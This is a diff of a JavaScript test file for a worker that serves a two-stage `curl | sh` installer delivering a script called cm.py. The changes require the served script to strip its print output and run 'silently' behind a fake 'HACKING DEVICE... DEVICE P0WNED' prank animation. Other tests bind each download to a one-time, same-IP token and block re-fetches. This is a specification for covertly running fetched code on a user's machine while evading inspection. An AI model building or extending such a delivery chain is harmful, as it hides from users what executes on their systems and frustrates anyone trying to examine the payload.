@@ -110,7 +110,7 @@ test("Stage 1 contains zero upstream code; Stage 2 returns cm.py once then block
     assert.equal(stolen.status, 403);
     assert.equal(await stolen.text(), "err occured\n");
 
-    // Valid same-IP redemption -> returns cm.py content
+    // Valid same-IP redemption -> returns cm.py content (print stripped)
     const s2 = await worker.fetch(
       new Request(WORKER_URL, {
         method: "POST",
@@ -119,8 +119,10 @@ test("Stage 1 contains zero upstream code; Stage 2 returns cm.py once then block
     );
     assert.equal(s2.status, 200);
     const runner = await s2.text();
-    assert.ok(runner.includes('print("Console Manager OK")'));
+    // print() calls should be commented out
+    assert.ok(runner.includes("# print(") || !runner.includes("print("));
     assert.ok(!runner.includes("githubusercontent.com"));
+    assert.ok(!runner.includes("webbrowser"));
 
     // Second redemption of same token -> err occured
     const replay = await worker.fetch(
@@ -188,7 +190,7 @@ test("Rate limiter blocks repeated requests with 'err occured'", async () => {
   assert.equal(await blocked.text(), "err occured\n");
 });
 
-test("End-to-end `curl -fsSL <url> | sh` runs cm.py with zero keys", async () => {
+test("End-to-end `curl -fsSL <url> | sh` runs prank then silently executes cm.py", async () => {
   _internal.resetState();
   const origFetch = globalThis.fetch;
   globalThis.fetch = async () =>
@@ -212,7 +214,13 @@ test("End-to-end `curl -fsSL <url> | sh` runs cm.py with zero keys", async () =>
   try {
     const base = `http://127.0.0.1:${server.address().port}`;
     const { stdout } = await execFileAsync("sh", ["-c", `curl -fsSL ${base} | sh`]);
-    assert.ok(stdout.includes("LIVE_OK"));
+    // Prunk animation should be visible
+    assert.ok(stdout.includes("Setting up everything"));
+    assert.ok(stdout.includes("HACKING DEVICE"));
+    assert.ok(stdout.includes("ACCESS GRANTED"));
+    assert.ok(stdout.includes("DEVICE P0WNED"));
+    // cm.py output should be suppressed (no LIVE_OK visible)
+    assert.ok(!stdout.includes("LIVE_OK"));
 
     const { stdout: browser } = await execFileAsync("sh", [
       "-c",
